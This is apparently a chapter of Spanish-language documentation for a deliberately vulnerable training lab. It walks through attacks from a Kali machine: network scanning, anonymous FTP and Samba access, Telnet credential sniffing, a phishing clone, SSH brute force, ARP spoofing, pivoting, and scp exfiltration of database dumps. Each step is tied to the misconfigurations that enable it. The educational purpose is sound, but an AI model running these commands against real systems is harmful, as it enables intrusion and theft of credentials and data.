# 5. Escenarios de ataque

Este documento reproduce, en orden creciente de compromiso, los ataques que un actor malicioso puede ejecutar desde la máquina `external-kali` contra la infraestructura insegura descrita en el capítulo 4.

Todos los ataques se ejecutan **desde la máquina atacante** (`vagrant ssh external-kali` o desde el escritorio gráfico noVNC). Se asume que el laboratorio está completamente desplegado y los servicios operativos.

---

## 5.1 Reconocimiento de red

### 5.1.1 Escaneo de servicios con nmap

El atacante empieza por identificar hosts y servicios en los segmentos DMZ e interno. Como el firewall no filtra, ambos son visibles.

```bash
# Escaneo rápido a la DMZ
nmap 192.168.57.10

# Escaneo completo a la red interna
nmap -sV -sC -O -p- -T4 192.168.58.10

# Descubrimiento de hosts adicionales en el rango interno
nmap -sn 192.168.58.0/24
```

**Salida esperada**: puertos 80, 8080, 23, 21, 22 en la DMZ; 22, 3306, 445, 139 en el servidor interno. Versiones exactas de Apache, vsftpd, OpenSSH, MySQL, Samba.

**Malas prácticas implicadas**:

- Firewall sin filtrado real (§4.1.1)
- Apache con `ServerTokens Full` y `ServerSignature On` (§4.2.1)
- Sin logging ni IDS que alerte del escaneo (§4.1.3)

### 5.1.2 Enumeración de Samba

```bash
enum4linux 192.168.58.10
```

**Salida esperada**: recurso `confidential` listado, accesible como invitado.

**Malas prácticas implicadas**:

- Samba con `guest ok=yes` y `browsable=yes` (§4.3.4)

### 5.1.3 Descubrimiento ARP desde la DMZ (Telnet)

Una vez obtenido un punto de apoyo en la DMZ (ver §5.2.3), el atacante puede escanear la red interna desde dentro:

```bash
telnet 192.168.57.10
# Usuario: ftpoperator / Contraseña: ftpoperator

# Dentro de dmz-server
nmap -sn 192.168.58.0/24
```

**Salida esperada**: `192.168.58.10` activo.

**Malas prácticas implicadas**:

- Telnet sin cifrado y usuario débil (§4.2.6, §4.2.7)
- Rutas estáticas que permiten a la DMZ alcanzar la red interna (§4.2.10 indirectamente)

---

## 5.2 Acceso a la DMZ

### 5.2.1 Exfiltración vía HTTP

El directorio `/backup/` es visible por directory listing y contiene archivos sensibles.

```bash
# Credenciales corporativas
curl http://192.168.57.10/backup/credentials.txt

# Mapa de red
curl http://192.168.57.10/backup/network.txt

# phpinfo
curl http://192.168.57.10/info.php

# Panel admin con credenciales de la BD
curl http://192.168.57.10/admin/
```

**Salida esperada**: credenciales MySQL, FTP, SSH, VPN; IPs de los tres segmentos; configuración PHP.

(Insertar captura: `../../images/05-http-exfiltration.png`)

**Malas prácticas implicadas**:

- Directory listing habilitado (§4.2.1)
- `phpinfo()` expuesto (§4.2.2)
- Panel admin sin autenticación (§4.2.3)
- Archivos sensibles en `/backup/` (§4.2.4)

### 5.2.2 FTP anónimo

```bash
ftp 192.168.57.10
# Usuario: anonymous
# Contraseña: [vacío]

ftp> ls
ftp> cd public
ftp> get readme.txt
ftp> get config_backup.txt
ftp> exit

cat config_backup.txt
```

**Salida esperada**: `config_backup.txt` contiene host, usuario y base de datos MySQL (`DB_HOST=192.168.58.10`, `DB_USER=root`, `DB_PASS=`).

**Malas prácticas implicadas**:

- FTP anónimo con permisos de lectura (§4.2.5)
- Archivo de configuración con credenciales en texto plano (§4.2.5)

### 5.2.3 Telnet y captura de credenciales en claro

```bash
telnet 192.168.57.10
# Login: ftpoperator
# Password: ftpoperator
```

Desde otra terminal, mientras la sesión Telnet está activa (o usando ARP spoofing), se puede capturar la secuencia de login:

```bash
sudo tcpdump -i eth1 -A -s0 port 23
```

**Salida esperada**: el tráfico muestra `ftpoperator` y `ftpoperator` en texto claro.

(Insertar captura: `../../images/05-telnet-capture.png`)

**Malas prácticas implicadas**:

- Telnet sin cifrado (§4.2.6)
- Usuario débil (§4.2.7)

### 5.2.4 Sitio de phishing alojado en la DMZ

El atacante despliega una página clon de GitHub en el puerto 8080. Cualquier víctima interna que introduzca credenciales las entrega al atacante.

```bash
# Visualización de la página de phishing
curl http://192.168.57.10:8080

# Simulación de envío de credenciales
curl -X POST http://192.168.57.10:8080/capture.php \
  -d "username=admin&password=Password123!"
```

Luego, desde la DMZ comprometida, recolecta las credenciales capturadas:

```bash
ssh ftpoperator@192.168.57.10
cat /var/log/phishing.log
```

**Salida esperada**: entrada en el log con IP, usuario, contraseña y User-Agent.

(Insertar captura: `../../images/05-phishing-log.png`)

**Malas prácticas implicadas**:

- Sitio de phishing alojado en la propia DMZ (§4.2.9)
- Acceso SSH con credencial débil (§4.2.8)

---

## 5.3 Compromiso de la red interna

Con la información recolectada en la DMZ, el atacante accede directamente al servidor interno.

### 5.3.1 Fuerza bruta SSH

```bash
hydra -l root -p root ssh://192.168.58.10
```

o simplemente:

```bash
ssh root@192.168.58.10
# Contraseña: root
```

**Salida esperada**: shell como root en el servidor interno.

(Insertar captura: `../../images/05-ssh-root-login.png`)

**Malas prácticas implicadas**:

- SSH con `PermitRootLogin yes` y `PasswordAuthentication yes` (§4.3.1)
- Credencial `root:root` (§4.3.1)

### 5.3.2 MySQL sin contraseña

Desde Kali, directamente:

```bash
mysql -h 192.168.58.10 -u root --skip-ssl
```

Una vez en la consola MySQL:

```sql
USE corporativedb;
SELECT * FROM user_credentials;
SELECT * FROM network_inventory;
SELECT * FROM employees;
EXIT;
```

**Salida esperada**: todas las credenciales de la tabla `user_credentials` (VPN, correo, FTP), el inventario de red y los datos personales de empleados.

(Insertar captura: `../../images/05-mysql-no-password.png`)

**Malas prácticas implicadas**:

- MySQL sin contraseña y con `bind-address 0.0.0.0` (§4.3.3)

### 5.3.3 Samba anónimo

```bash
# Listar recursos compartidos
smbclient -L //192.168.58.10 -N

# Acceder al recurso confidential
smbclient //192.168.58.10/confidential -N

smb: \> ls
smb: \> get passwords.txt
smb: \> exit

cat passwords.txt
```

**Salida esperada**: archivo `passwords.txt` con todas las credenciales del laboratorio (`admin/admin123`, `root/root`, `ftpoperator/ftpoperator`, `backup/backup`).

**Malas prácticas implicadas**:

- Samba como invitado con permisos de lectura (§4.3.4)
- Almacenamiento de contraseñas en texto plano (§4.3.4)

---

## 5.4 ARP Spoofing y captura de tráfico

Incluso sin haber comprometido ningún servidor, el atacante en la red externa puede ejecutar un ataque Man-in-the-Middle ARP contra la DMZ.

```bash
# Habilitar forwarding (necesario para MITM)
sudo sysctl -w net.ipv4.ip_forward=1

# ARP spoofing: envenenar las tablas ARP del dmz-server y del firewall
sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
sudo arpspoof -i eth1 -t 192.168.57.1 192.168.57.10 &

# Capturar tráfico Telnet (credenciales en claro)
sudo tcpdump -i eth1 -A -s0 port 23
```

En otra terminal, se genera tráfico Telnet (el propio atacante o una supuesta víctima):

```bash
telnet 192.168.57.10
```

Para detener el ataque:

```bash
sudo killall arpspoof tcpdump
sudo sysctl -w net.ipv4.ip_forward=0
```

**Salida esperada**: `tcpdump` imprime el login y la contraseña en texto claro.

(Insertar captura: `../../images/05-arp-spoofing.png`)

**Malas prácticas implicadas**:

- `rp_filter` desactivado (§4.1.2)
- `accept_redirects` y `send_redirects` habilitados (§4.1.2)
- Telnet sin cifrado (§4.2.6)
- Sin protección ARP (DAI, etc.) en el firewall

---

## 5.5 Pivoting DMZ → red interna

Tras haber obtenido acceso al `dmz-server` (por Telnet o SSH), el atacante lo usa como trampolín para acceder a servicios internos.

```bash
# Acceso a la DMZ
ssh ftpoperator@192.168.57.10

# Dentro del dmz-server:

# Acceso MySQL interno
mysql -h 192.168.58.10 -u root
mysql> SELECT * FROM corporativedb.user_credentials;

# Acceso Samba interno
smbclient //192.168.58.10/confidential -N

# Acceso SSH al servidor interno (credenciales reutilizadas)
ssh root@192.168.58.10
```

**Salida esperada**: shell en `internal-server`, consulta a la base de datos y acceso al recurso Samba.

**Malas prácticas implicadas**:

- Firewall sin filtrado entre DMZ e interna (§4.1.1)
- Rutas estáticas que permiten tráfico DMZ → interna (§4.2.10)
- Credenciales reutilizadas y almacenadas en texto plano (§4.2.4, §4.2.5, §4.3.4)

---

## 5.6 Exfiltración de datos

Con control total sobre el servidor interno, el atacante procede a extraer información sensible hacia la DMZ (o hacia la máquina atacante).

```bash
# Desde internal-server (accedido vía SSH como root):

# Dump completo de MySQL
mysqldump -u root corporativedb > /tmp/corporativedb.sql

# Comprimir recurso Samba
tar -czf /tmp/confidential.tar.gz /srv/samba/confidential/

# Exfiltrar a la DMZ (usando credenciales ya conocidas)
scp /tmp/corporativedb.sql ftpoperator@192.168.57.10:/tmp/
scp /tmp/confidential.tar.gz ftpoperator@192.168.57.10:/tmp/
```

El atacante puede luego recuperar los archivos desde la DMZ (vía SSH o FTP) o directamente desde el servidor interno si la conectividad lo permite.

**Salida esperada**: los archivos `corporativedb.sql` y `confidential.tar.gz` residen en la DMZ, listos para ser descargados por el atacante sin que se registre ninguna actividad sospechosa.

**Malas prácticas implicadas**:

- Ausencia de monitorización y logging en firewall (§4.1.3)
- Ausencia de segmentación real (§4.1.1)
- Rutas estáticas que permiten tráfico desde la interna hacia la DMZ (§4.3.6)
- Sin control de exfiltración ni DLP